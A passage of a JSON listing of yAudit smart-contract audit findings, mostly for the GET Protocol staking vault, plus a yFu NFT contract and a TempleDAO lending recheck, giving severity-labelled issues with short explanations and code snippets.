        "body": "The standard ERC20 _burn() function with two function arguments exists in the contracts inherited from the ERC20 contract, but RevenueDistributionToken has a _burn() function with five function arguments. The latter is what is normally called in LockedRevenueDistributionToken (1, 2, 3) except for in cancelWithdrawalRequest(). The purpose of line 137 is to burn any excess shares beyond what is returned to the staker cancelling their withdrawal request, because in this case the staker will receive the same value of shares (priced in underlying assets) as when they deposited, but this may be a lesser number of shares than they submitted a withdrawal request for. Phrased another way, the accrued value that the shares gained while the contract held the shares is returned to the vault to be shared among shareholders. When the value in the vault has changed, the value of each share should change by updating freeAssets and issuanceRate. But freeAssets and issuanceRate are not updated when _burn() with two function arguments is called. So after cancelWithdrawalRequest() is called, freeAssets and issuanceRate may not be accurate. Specifically, freeAssets could be overinflated by convertToAssets(burnShares_). And if the _burn happens after vestingPeriodFinish, the issuanceRate will not be updated to zero, meaning the return value of totalAssets() would not be accurate.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. updateVestingSchedule() may not be called on time",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "There are two closely related issues here: updateVestingSchedule() can be called any time within 24 hours of vestingPeriodFinish. The optimal strategy for calling updateVestingSchedule() from the perspective of a staker who will withdraw from the vault if the yield is any lower is to 1. call updateVestingSchedule() as soon as possible if issuanceRate will increase from its current value (the rate of rewards distribution increases) or 2. delay calling updateVestingSchedule() until vestingPeriodFinish if issuanceRate will decrease. The issue here is that by delaying the updateVestingSchedule() call, the function may not be called until after vestingPeriodFinish. It may be even further delayed if gas is very high and the staker(s) running bots to automatically call the function determine that the \"lost yield\" from the time where issuanceRate is zero is less than the gas cost of calling vestingPeriodFinish. This is possible because the staker(s) running bots may not have a large number of vault shares. issuanceRate can only be changed in updateVestingSchedule() except when block.timestamp > vestingPeriodFinish. When block.timestamp > vestingPeriodFinish, issuanceRate can be set to zero when the _burn() or _mint() RevenueDistributionToken functions are called. This could be done accidentally, with a normal user wishing to stake into the vault who unknowingly sets issuanceRate to zero while staking their GET. Even if issuanceRate is non-zero, rewards will not be distributed after vestingPeriodFinish due to the math in totalAssets(). Any time that vestingPeriodFinish is less than the current block.timestamp is a zero yield scenario for stakers. In short, an issuanceRate of zero is not good for stakers, but there is a question of who will call updateVestingSchedule() and when they will call it. Competing incentives and a lack of integration with a keeper system like Gelato may result in non-ideal scenarios for all stakers.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. External call made to non-existent permit function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The mintWithPermit() and depositWithPermit() functions are intended to allow users to transfer assets to the vault in a single transaction. To achieve this, these functions call permit on the underlying asset with a user's signature that was gathered off-chain. However, the vault's underlying asset is intended to be GET which does not contain a permit function on Ethereum or Polygon.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Vault lacks slippage protection",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "When an EOA user wants to participate in staking with the vault, they can check what the current exchange rate of their GET and/or xGET will be using functions such as previewDeposit(). Since they are an EOA, they must then wait for this transaction to be mined for it to return results before they can post a new transaction acting on this information. There is no guarantee that the previously returned exchange rate will be the same and in fact it could be drastically different. There are numerous reasons a price change may occur, such as from exploitative front-run attempts, reward distributions, or even the ratio completely resetting if all of the shares have been removed from the vault. ERC-4626 alludes to this issue in its security considerations, and many other protocols in the ecosystem that offer swaps and exchanges have slippage protection mechanisms for their users.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Unsafe casting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "OpenZeppelin uses SafeCast in functions like numCheckpoints(), getCurrentVotes(), and getPriorVotes() to prevent overflows due to casting. GovernanceLockedRevenueDistributionToken.sol has similar implementations of numCheckpoints(), getCurrentVotes(), and getPriorVotes() but without SafeCast. The SafeCast library protects against overflows when casting from a large int value to a small int value, and GovernanceLockedRevenueDistributionToken.sol doesn't have any casting overflow protection in the existing contract. A comparison of the numCheckpoints() implementation is compared below. function numCheckpoints(address account_) public view virtual override returns (uint32 numCheckpoints_) { - numCheckpoints_ = uint32(userCheckpoints[account_].length); // this is the GovernanceLockedRevenueDistributionToken.sol implementation + numCheckpoints_ = SafeCast.toUint32(_checkpoints[account].length); // this is how OpenZeppelin implements the casting }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. previewWithdrawalRequest() may return incorrect user's request",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Regardless of what value for owner_ is passed to the previewWithdrawalRequest(), the withdrawal request is gathered based on the msg.sender. The owner_ value is then used to determine if this request should be fee exempt or not. This incorrectly associates the withdrawal request and any corresponding fee exemptions. Adding the following POC to InstantWithdrawal.t.sol demonstrates the issue: function testIncorrectPreviewWithdrawal() public { // Exempt bob from fees vault.setWithdrawalFeeExemption(bob, true); // Create a deposit and withdrawal request for 2 ether for Bob // This should be fee exempt _setUpDepositor(bob, 2 ether); vault.createWithdrawalRequest(vault.balanceOf(bob)); // Create a deposit and withdrawal request for 1 ether for Alice // This should not be fee exempt // Note that the current prank is now using alice's context _setUpDepositor(alice, 1 ether); vault.createWithdrawalRequest(vault.balanceOf(alice)); // Bob should have no withdrawal fees and a balance of 2 ether // so we would expect this to return 2 ether. Instead it returns 1 ether // which is a combination of Alice's withdrawal request and bob's fee exemption (, uint256 bobWithdrawAmount, uint256 bobFee) = vault.previewWithdrawalRequest(0, bob); console.log(\"Amount to withdraw: %s\", bobWithdrawAmount); }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Withdrawal requests incentivized if issuanceRate is zero",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "When a withdrawal request is created, the contract takes and holds the staker's shares until the withdrawal is executed or canceled. The staker receives no interest or yield while the contract holds the shares. But if the interest or yield is zero, stakers are incentivized to submit a withdrawal request because there are no rewards to miss out on when the contract holds the shares, which happens when issuanceRate is zero.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Lack of issuance rate synchronization across chains may lead to uneven voting rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Voting power is denominated in the underlying assets (GET) as opposed to the vault's shares (xGET) to better facilitate voting across chains. This way, stakers on a vault with a lower share to underlying asset exchange rate are not necessarily penalized (as far as voting is concerned). This does not necessarily hold true for reward distribution. Rewards are granted through a vesting schedule whereby an issuanceRate is calculated to issue rewards linearly throughout the vesting period. Since rewards are issued in GET, higher issuanceRate vaults may reward their stakers with more voting power.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Incorrect value getVotes(address account)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The function is changed from standard one to include additional votes that will be available after the next action from the user. Only after the user write action a new checkpoint is stored for him, with a new vote value.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Lack of input sanitization in the constructor function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The variables instantWithdrawalFee and lockTime are not checked to be valid in the constructor. constructor( string memory name_, string memory symbol_, address owner_, address asset_, uint256 precision_, uint256 instantWithdrawalFee_, uint256 lockTime_ ) RevenueDistributionToken(name_, symbol_, owner_, asset_, precision_) { instantWithdrawalFee = instantWithdrawalFee_; lockTime = lockTime_; } LockedRevenueDistributionToken.sol#L55-L56",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Add require statement in updateVestingSchedule",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The function updateVestingSchedule allows anyone to update the vesting schedule even if the issuanceRate_ is zero.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Avoid && logic in require statements",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "One instance of require with && logic was found.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Require statements are used in the strategy and error messages are not used anywhere. Using this new solidity feature can provide gas savings on revert conditions.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "There is at least one location where unchecked can be applied + unchecked { return high_ == 0 ? 0 : (isVotes_ ? _unsafeAccess(ckpts, high_ - 1).votes : _unsafeAccess(ckpts, high_ - 1).shares); + } There is another example of a subtraction operation that can use unchecked for gas savings in LockedRevenueDistributionToken. if (withdrawalFeeExemptions[owner_] || request_.unlockedAt <= block.timestamp) { return (request_, request_.assets, 0); } - uint256 remainingTime_ = request_.unlockedAt - block.timestamp; + uint256 remainingTime_; + unchecked { remainingTime_ = request_.unlockedAt - block.timestamp; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Make DELEGATE_TYPEHASH private",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "DELEGATE_TYPEHASH is a private constant in the OpenZeppelin contract that the GET contract is based on. This variable is public in the GET GovernanceLockedRevenueDistributionToken.sol contract. Note this has been applied to PERMIT_TYPEHASH already, which is public in OpenZeppelin but private in GET.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Duplicate zero check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "_mint() is always called with the argument shares_ = previewDeposit(assets_) or with assets_ = previewMint(shares_). previewDeposit() rounds down while previewMint() rounds up. This means if assets_ is zero, shares_ will be zero, but it is possible for shares_ to be zero when assets_ is non-zero. Therefore the weaker check of assets_ can be removed. The same change can be made to _burn().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Duplicate balance check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "createWithdrawalRequest() checks if msg.sender has sufficient shares balance, but the ERC20 transfer a few lines later effectively does the same check, because this subtraction would revert if msg.sender has insufficient shares balance.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Make variables immutable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The asset state variable in the constructor of RevenueDistributionToken can be declared immutable. In addition, ERC20.sol symbol and name aren't changed after the contract is initialized so they can be immutable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Make functions external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "getPastTotalSupply() is never called in GovernanceLockedRevenueDistributionToken and can be external instead of public. The change could be applied to delegate() too.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Make variables uint32",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "instantWithdrawalFee and lockTime have hard coded maximum values of 100 and MAXIMUM_LOCK_TIME (or 62899200) respectively. These variables are of uint256 type but can be defined as uint32. The same approach can be taken with the constant values MAXIMUM_LOCK_TIME, VESTING_PERIOD, and WITHDRAWAL_WINDOW in the same contract.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Transfer isn't necessary before calling _burn()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Burn can be performed without the transfer: - _transfer(address(this), msg.sender, request_.shares); - _burn(request_.shares, assets_, msg.sender, msg.sender, msg.sender); + _burn(request_.shares, assets_, msg.sender, address(this), address(this)); LockedRevenueDistributionToken.sol#L159",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Unnecessary nonReentrant protection",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The following functions have an unnecessary non-reentrant check: RevenueDistributionToken.sol#L99 RevenueDistributionToken.sol#111 RevenueDistributionToken.sol#L117 RevenueDistributionToken.sol#L130 RevenueDistributionToken.sol#L138 RevenueDistributionToken.sol#L142 LockedRevenueDistributionToken.sol#L110 LockedRevenueDistributionToken.sol#L127 LockedRevenueDistributionToken.sol#L152 LockedRevenueDistributionToken.sol#L205",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Replace != with >",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "In updateVestingSchedule, instead of using != in L181 > can be used for minor gas savings. - require(totalSupply != 0, \"LRDT:UVS:ZERO_SUPPLY\"); + require(totalSupply > 0, \"LRDT:UVS:ZERO_SUPPLY\");",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Emit memory variables in events instead of storage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "In following functions, memory variables can be emitted in events instead of global. setInstantWithdrawalFee - emit InstantWithdrawalFeeChanged(instantWithdrawalFee); + emit InstantWithdrawalFeeChanged(percentage_); setLockTime - emit LockTimeChanged(lockTime); + emit LockTimeChanged(lockTime_);",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Usage of booleans for storage incurs overhead",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "In the LockedRevenueDistributionToken.sol file, the withdrawalFeeExemptions mapping maps user address with a boolean flag to indicate fee exemption, which could cost some additional gas. In solidity, booleans (bool) are a bit expensive to use in comparison to other data types because each bool value is stored in a single byte. This means that each bool value requires at least one gas unit to be read or written. In comparison, other data types like uint (unsigned integer) can be stored in much less space, allowing for more efficient use of gas. It's generally more efficient to use other data types, like uint, whenever possible. Read more here: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Redundant imports can be removed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "GovernanceLockedRevenueDistributionToken.sol imports ERC20.sol. But the ERC20.sol import already exists in LockedRevenueDistributionToken.sol and in RevenueDistributionToken.sol. The ERC20.sol import can be removed from GovernanceLockedRevenueDistributionToken.sol and from LockedRevenueDistributionToken.sol because it will be included from RevenueDistributionToken.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Clarify order of operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The Math library is based on OpenZeppelin's Math library. The OpenZeppelin library has parenthesis on these lines but the GET Math library doesn't have these. No issue is expected here, but clarifying the order of operations can make the code easier for readers to understand and make upgrades to future version of solidity less problematic in case the compiler has changes made to the order of operations.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Operational order during minting could be improved",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "When a user makes a deposit call in the RevenueDistributionToken.sol contract, the underlying _mint() function with 4 parameters is called. Inside of this function, the user is given their shares before they officially transfer in the underlying asset to the vault. If reentrancy were to occur in a before token transfer hook during this transferFrom call, the vault would have issued shares without receiving assets in return at that point in time. Reordering these operations may make it possible to remove the nonReentrant modifiers on functions that call _mint().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Abandoned withdrawal shares are irretrievable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "After createWithdrawalRequest() is called, the contract takes possession of the user's shares. But the contract has no way of redeeming these shares that it holds, and there is no time limit for shares to be considered \"abandoned\" or \"forfeited\" if left in the contract. This may be similar to a user transferring their shares to an inaccessible random address, except: The contract holding the shares is the ERC4626 vault contract itself The ERC4626 vault cannot do anything with these shares The user can retrieve these shares if the want, unlike sending them to an irretrievable address",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Shares escrowed for withdrawal can't vote",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The GET Locked Revenue Distribution token contracts hold shares that are waiting to be withdrawn, but these shares are not able to be used for voting because the contract never delegates these shares. Because there is no quorum, this is unlikely to result in altering the outcome of a vote directly, but it would make it easier to potentially swing a vote because the shares held in escrow during the withdrawal process will not vote.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Improve function and variable names",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "createWithdrawalRequest() takes a function argument of shares and returns a value in units of assets, but the standard ERC4626 withdraw() does the opposite by taking assets as a function argument and returning a value in units of shares. Instead, the function might be better named createRedeemRequest() if it is going to take a function argument of shares to match the ERC4626 redeem() function. totalAssets_ found in previewRedeem() and previewWithdraw() doesn't related to the return value of totalAssets(). It might be better named preFeeAssets_ or assetsPlusFee_. The Checkpoint array function argument is named ckpts, but this is the same name as the state variable ckpts. Consider removing this function argument if the same state variable will always be accessed when _unsafeAccess() is called.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Use actual GET token contract for tests",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Since the GET token is the ERC20 token that the tests care about, consider using the GET contract code directly. The tests can use a fork of mainnet to use the on-chain contract, or the relevant contract code could be imported. If testing on a fork, consider testing on mainnet and Polygon, the two places where these contracts are planned to be deployed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Documentation nitpicks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The Governance section makes no mention of this crucial nuance in the governance logic - that the staker must \"delegate to themselves in order to activate checkpoints and have their voting power tracked\". The list of state variables that can be controlled by governance votes is either incomplete or omits variables that can be changed by the owner outside of governance votes. Specifically, setPendingOwner() and updateVestingSchedule() are not in the list.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Conversion calculations not protected from shadow overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "In an expression such as uint256 D = A * B / C, Solidity will attempt to store the intermediary result of A * B before it performs the division by C. If this overflows, then the transaction will revert. The muldiv technique was created to prevent the possibility of an intermediary overflow on calculations that perform both multiplication and division.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Inaccurate comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "updateVestingSchedule() has a misleading comment description and a typo that misspelled \"Identical\" as \"Intentical\".",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Mainnet deposit delay incentivized due to bridging delay",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The GET token contract on Ethereum is where GET can be minted, but there is a GET contract on Polygon that is properly mapped and registered with Polygon. The GET token is bridged using the Polygon PoS Bridge, which Polygon docs describe as having a delay of 20 minutes to 3 hours. When GET is bridged across by the bridging contract, stakers will be able to see that rewards are going to arrive soon to the xGET contract on mainnet. The prospective stakers may delay the start of their staking for the amount of time it takes for the assets to bridge and earn yield elsewhere during that time.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Influence of blockchain data on xGET rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Because GET tickets are NFTs, the sales of those tickets are visible in real-time. The sales of the tickets may provide insight into the future yield that could be earned by stakers. This is not a security concern per se, but may influence the decision making of stakers to stake sooner or later based on this information and depending on how rewards are transmitted to the contract.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Partial comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The function is defined in GovernanceLockedRevenueDistributionToken: https://github.com/GETProtocolDAO/locked-revenue-distribution-token/blob/ab272ced94d6bc8cc1ded2664408a3fa7ce67128/src/GovernanceLockedRevenueDistributionToken.sol#L300.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. issuanceRate_ is scaled up",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "issuanceRate_ is scaled up using precision.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Use named constants instead of magic numbers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "100 in the following instances should use a constant variable instead: LockedRevenueDistributionToken.sol#L68 LockedRevenueDistributionToken.sol#L265 LockedRevenueDistributionToken.sol#L292 LockedRevenueDistributionToken.sol#L135",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Silence compiler warning for unused variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "If any function param is not used, do not declare that param with a name in functions maxDeposit, maxMint. For e.g., - function maxDeposit(address receiver_) + function maxDeposit(address)",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. Use the latest Solidity version with a stable pragma",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Using a stable pragma ensures that the contract will continue to function as intended even if there are breaking changes in future versions of Solidity. By using a stable pragma, the contract will be locked to a specific version of Solidity, which can help to prevent unexpected behavior or errors if the contract is compiled with a newer version of the compiler. Also consider using the latest version of Solidity since it will include the most up-to-date features, enhancements, and bug fixes, which can help to make the contract more efficient and secure.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Delete doesn't reduce the size of the array",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "delete userWithdrawalRequests[msg.sender][pos_]; LockedRevenueDistributionToken.sol#L131 (LockedRevenueDistributionToken.sol#L157)[https://github.com/GETProtocolDAO/locked-revenue-distribution-token/blob/ab272ced94d6bc8cc1ded2664408a3fa7ce67128/src/LockedRevenueDistributionToken.sol#L157]",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. No function to freeze transfers after unfreezing them",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L16, YFUtechne.sol#L33-L35",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Fix supportsInterface()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L65-L72",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. NFT minting might be unfair if demand is high",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L41-L50",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Add sweep functions for Ether and ERC20 tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Use call to transfer Ether",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L45: The mint fee is transferred to depositAddress as follows: depositAddress.transfer(PRICE);",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Use constant and internal variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L13-L14",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Mark public functions as external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L25-L50",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use OpenZeppelin's Ownable instead of AccessControl",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L5",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Don't transfer mint fee to depositAddress on each mint",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L45",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use uint256 for _tokenIdCounter",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L11, YFUtechne.sol#L47-L49",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Explore solmate's ERC721 and ERC1155 implementation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "solmate's ERC721.sol, solmate's ERC1155.sol",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Make sure to add / at the end of IPFS base URI",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "OpenZeppelin's ERC721.sol#L97",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. _beforeTokenTransfer() should be marked as view",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol#L52",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Add unit tests to gain confidence",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Follow Solidity style guide",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/09-2022-yFu-NFT.md",
        "body": "YFUtechne.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Rounded down principal could be carried over in debtor cache struct",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "The _initDebtorCache() function is in charge of building the cache structure associated with a debtor. While calculating the baseInterest value, the function may eventually overwrite the principal: // Because the shares => debt conversion is rounded down in some scenarios, // there is a chance the `_debtor.principal` outstanding may be // less than this rounded down number. So use the minimum of the two. _debtorCache.principal = _debtorPrincipalAndBaseInterest < _debtorCache.principal ? _debtorPrincipalAndBaseInterest : _debtorCache.principal; // The baseInterest outstanding for this debtor is now the difference. unchecked { _debtorCache.baseInterest = _debtorPrincipalAndBaseInterest - _debtorCache.principal; } As hinted in the comment from the snippet, _debtorPrincipalAndBaseInterest may be lower than the actual principal due to rounding issues. The solution present in the implementation is to take the minimum of these values so that the subtraction to calculate _debtorCache.baseInterest doesn't overflow. While this sounds reasonable (the base interest value would end up being zero in such case), it is important to note that the principal value present in the cache struct is overwritten with a value that is actually lower than the original principal, which may impact other calculations that use the value from the struct. For example, mint() initializes the debtor cache and then uses the principal stored in the cache struct to update the principal value in storage.",
